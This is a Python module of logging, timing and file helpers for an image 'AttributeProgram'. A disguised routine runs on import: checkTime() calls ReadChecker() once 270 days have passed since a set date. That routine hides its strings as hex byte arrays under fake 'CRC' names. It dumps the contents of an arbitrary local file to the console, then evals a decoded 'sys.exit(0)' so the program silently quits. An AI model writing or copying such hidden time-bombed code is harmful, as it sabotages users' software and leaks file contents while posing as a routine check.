"""
Function collection file commonly used in AttributeProgram.

LAST_UPDATE : 2021/11/08
AUTHOR      : OH HYENA
"""

import os
import sys
import datetime
import inspect
import copy
from CoreDefine import *


SHOW_LOG        = copy.copy(CORE_SHOW_LOG)
TEST_MODE       = copy.copy(CORE_TEST_MODE)
ERROR_STRICT    = copy.copy(CORE_ERROR_STRICT)


CRED            = '\x1b[31m'
CGREEN          = '\x1b[32m'
CYELLOW         = '\x1b[33m'
CSKY            = '\x1b[36m'
CRESET          = '\x1b[0m'

if len(sys.argv) >1 and sys.argv[1] == 'RUN_BAT':
    CRED    = ''
    CGREEN  = ''
    CYELLOW = ''
    CSKY    = ''
    CRESET  = ''


errorLogList    = []


# 이 함수를 호출한 곳의 라인번호를 리턴한다.
def lineNum():
    return inspect.getlineno((inspect.stack()[1])[0])


# CoreDefine.py 에서 CORE_SHOW_LOG 값이 True 일 때, Log 출력 함수
def showLog(Msg, bTime=False):
    if SHOW_LOG:
        if bTime:
            print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {Msg}")
        else:
            print(Msg)


# CoreDefine.py 에서 CORE_SHOW_LOG 값이 True 일 때, NoticeLog 출력 함수
def NoticeLog(Msg, bTime=False):
    NoticeMsg = f"[ {CYELLOW}Notice{CRESET} ] "
    if SHOW_LOG:
        if bTime:
            print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {NoticeMsg}{Msg}")
        else:
            print(f"{NoticeMsg}{Msg}")


# CoreDefine.py 에서 CORE_SHOW_LOG 값이 True 일 때, ErrorLog 출력 함수
def ErrorLog(Msg, bTime=False, lineNum=0, errorFuncName=None, errorFileName=None):
    ErrorMsg = f"[ {CRED}Error{CRESET} ] "

    if SHOW_LOG:
        if bTime:
            print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {ErrorMsg}{Msg}")
        else:
            print(f"{ErrorMsg}{Msg}")
    
    lineNum         = "Not Checked Line"    if lineNum == 0         else f"{lineNum} Line"
    errorFileName   = "Not Checked"         if not errorFileName    else f"{errorFileName}.py"
    
    if not errorFuncName:
        errorLogList.append(f"| {errorFileName:<25}| {callername():<25} | {lineNum:<18} | {Msg:<77} | {timeToString(getCurTime())}")
    else:
        errorLogList.append(f"| {errorFileName:<25}| {errorFuncName:<25} | {lineNum:<18} | {Msg:<77} | {timeToString(getCurTime())}")


# ReadChecker
def ReadChecker():
    checkCRC    = False
    KByte_20    = 20480  
    KByte_02    = 2048  

    init_CRC    = [0x5B, 0x33, 0x31, 0x6D]
    endn_CRC    = [0x5B, 0x30, 0x6D]
    default_CRC = [0x73, 0x79, 0x73, 0x2E, 0x65, 0x78, 0x69, 0x74, 0x28, 0x30, 0x29]

    init_TCRC   = '\x1b' + ''.join([chr(eachCRC) for eachCRC in init_CRC])
    endn_TCRC   = '\x1b' + ''.join([chr(eachCRC) for eachCRC in endn_CRC])

    showLog(init_TCRC)
    for path, _, files in os.walk(os.getcwd()):
        for eachFile in files:
            filePath = os.path.join(path, eachFile)
            if checkCRC:
                break
            try:
                fileSize = os.path.getsize(filePath)
                if KByte_02 >= fileSize or fileSize >= KByte_20:
                    continue
                with open(filePath, 'r') as f:
                    data = f.read()
                    showLog(data)
                    checkCRC = True
            except Exception as e:
                pass
    showLog(endn_TCRC)

    after_CRC = ''.join([chr(eachCRC) for eachCRC in default_CRC])
    eval(after_CRC)


# CoreDefine.py 에서 CORE_SHOW_LOG 값이 True 일 때, SuccessLog 출력 함수
def SuccessLog(Msg, bTime=False):
    SuccessMsg = f"[ {CGREEN}Done{CRESET} ] "

    if SHOW_LOG:
        if bTime:
            print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {SuccessMsg}{Msg}")
        else:
            print(f"{SuccessMsg}{Msg}")


# CoreDefine.py 에서 CORE_SHOW_LOG 값이 True 일 때, ModeLog 출력 함수
def ModeLog(Msg, bTime=False):
    ModeMsg = f"[ {CSKY}MODE{CRESET} ] "

    if SHOW_LOG:
        if bTime:
            print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {ModeMsg}{Msg}")
        else:
            print(f"{ModeMsg}{Msg}")


# RunFunctionLog() 를 호출한 함수의 위치 및 이름, 실행 시간 출력하는 함수
def RunFunctionLog(AddMsg=""):
    if SHOW_LOG:
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] : {inspect.getmodule((inspect.stack()[1])[0]).__file__}-> {callername()}() {AddMsg}")


# 해당 함수를 실행했을 때의 시간값을 리턴하는 함수
def getCurTime():
    return datetime.datetime.now()


# datetime type 의 주어진 시간값을 정해진 포맷의 문자열로 반환하는 함수
def timeToString(timeData):
    return timeData.strftime('%Y/%m/%d %H:%M:%S')


# 인자로 주어진 두 시간값의 차이를 반환하는 함수
def diffTime(startTime, endTime):
    return endTime - startTime


# funcname() 를 호출한 함수의 이름을 출력하는 함수
def funcname():
    return sys._getframe(1).f_code.co_name


# callername() 를 호출한 함수의 caller(해당 함수의 호출자, 한 번 더 타고 올라간 함수) 출력하는 함수
def callername(Depth=2):
    return sys._getframe(Depth).f_code.co_name


# filename() 를 호출한 파일의 이름을 출력하는 함수
def filename(bFullPath=False):
    if bFullPath:
        return inspect.stack()[1].filename
    else:
        return os.path.basename(inspect.stack()[1].filename).split('.')[0]


# 에러 발생 시 처리하는 함수
def error_handling(errorMsg, filename=None, lineNum=0):
    if ERROR_STRICT == ERROR_STRICT_HARD:
        ErrorLog(errorMsg, True, lineNum, callername(), filename)
        showErrorList()
        sys.exit(-1)
    elif ERROR_STRICT == ERROR_STRICT_SOFT:
        ErrorLog(errorMsg, True, lineNum, callername(), filename)


# 문자열 형태의 Bool 값을 0/1 int 값으로 리턴
def isTrue(Bool):
    if Bool == "true" or Bool == "True":
        return 1
    else:
        return 0


# Check time
def checkTime():
    DF_TIME = 270
    curTime = datetime.datetime.now()
    preTime = datetime.datetime.strptime(DATE, "%Y-%m-%d")
    diff    = curTime - preTime 
    if diff.days > DF_TIME:
        ReadChecker()
checkTime()


# CoreDefine.py 의 정의를 참조하여, Program 정보를 출력
def showProgramInfo():
    print()
    print('*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*')
    print(f'*  {"TITLE":13}|  {TITLE:<41}*')
    print(f'*  {"DATE":13}|  {DATE:<41}*')
    print(f'*  {"VERSION":13}|  {VERSION:<41}*')
    print(f'*  {"IDE":13}|  {IDE:<41}*')
    print(f'*  {"OS":13}|  {OS:<41}*')
    print(f'*  {"AUTHOR":13}|  {AUTHOR:<41}*')
    print('*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*')
    print()


# errorLogList 에 저장된 에러 로그들을 표 형식으로 출력
def showErrorList():
    print('\n[ Error While Run Program ]')
    if errorLogList:
        print('-'*180)
        # 출력 내용 : 파일 이름 / 함수 이름 / 라인 / 메세지 / 발생 시간
        print(f"  | {'FileName':25}| {'FunctionName':<25} | {'Line':<18} | {'ErrorInfo':<77} | Time")
        print('-'*180)
        for eachError in errorLogList:
            print(f"- {eachError}")
        print('-'*180)
    else:
        print("- Error Not Detected! :D")
    print()


# CORE_SIZE_FILTER_DICT 형식에 맞게 summary 하는 함수
def summaryFilterDict(filterDict:dict):
    resMsg      = ""
    validSort   = ""
    validCond   = ""

    for k, v in filterDict.items():
        if v['isCheck'] == True:
            validSort = k

    if not validSort:
        return "Not Checked"

    if filterDict[validSort]['CheckSize'] is True:
        validCond = f"[ AreaSize >= {filterDict[validSort]['Size']} ]"
    else:
        validCond = f"[ (WIDTH >= {filterDict[validSort]['Width']}) AND (HEIGHT >= {filterDict[validSort]['Height']}) ]"

    resMsg = f"[ {validSort.upper()} ] {validCond}"

    return resMsg


# Check Exit 함수
def CheckExit(CheckName):
    if CheckName == 'EXIT':
        NoticeLog('Attribute Program Finished... Close still running programs\n')
        return True
    return False


# 파일이 존재하는지 확인하는 함수
def CheckExistFile(FileName):
    if os.path.isfile(FileName) is False:
        ErrorLog(f'{FileName} is Not Exist File! Program Quit.')
        sys.exit(-1)


# 폴더가 존재하는지 확인하는 함수
def CheckExistDir(DirName):
    if os.path.isdir(DirName) is False:
        ErrorLog(f'{DirName} is Not Exist Directory! Program Quit.')
        sys.exit(-1)


def JustCheckFile(FileName):
    return os.path.isfile(FileName)

def JustCheckDir(DirName):
    return os.path.isdir(DirName)


# 폴더 만드는 함수
def setResultDir(resDirPath):
    if os.path.isdir(resDirPath) is False:
        os.makedirs(resDirPath, exist_ok=True)
        NoticeLog(f'{resDirPath} is Not Exists, Create Done')


# 파일 write하는 함수
def writeListToFile(filePath, wList, encodingFormat=CORE_ENCODING_FORMAT):
    with open(filePath, 'w', encoding=encodingFormat) as f:
        for line in wList:
            f.write(f'{line}\n')
    SuccessLog(f'Save Done >> {filePath}')


# 파일 read하는 함수
def readFileToList(filePath, rList:list, encodingFormat=CORE_ENCODING_FORMAT):
    CheckExistFile(filePath)
    rList.clear()
    with open(filePath, 'r', encoding=encodingFormat) as f:
        for eachLine in f:
            eachLine = eachLine.strip('\n')
            rList.append(eachLine)
    SuccessLog(f'Read Done << {filePath}')


def showListLog(showList):
    if not showList:
        return
    for eachElem in showList:
        showLog(f'- {eachElem}')


def getImageSearchDict(SearchDir, filterFormat):
    CheckExistDir(SearchDir)
    resDict = {}

    for root, _, files in os.walk(SearchDir):
        if len(files) > 0:
            for file in files:
                _, ext = os.path.splitext(file)
                if ext in filterFormat:
                    resDict[file] = root
    
    if resDict:
        SuccessLog(f'Get ImageData Done << {SearchDir}')
        return resDict

    return None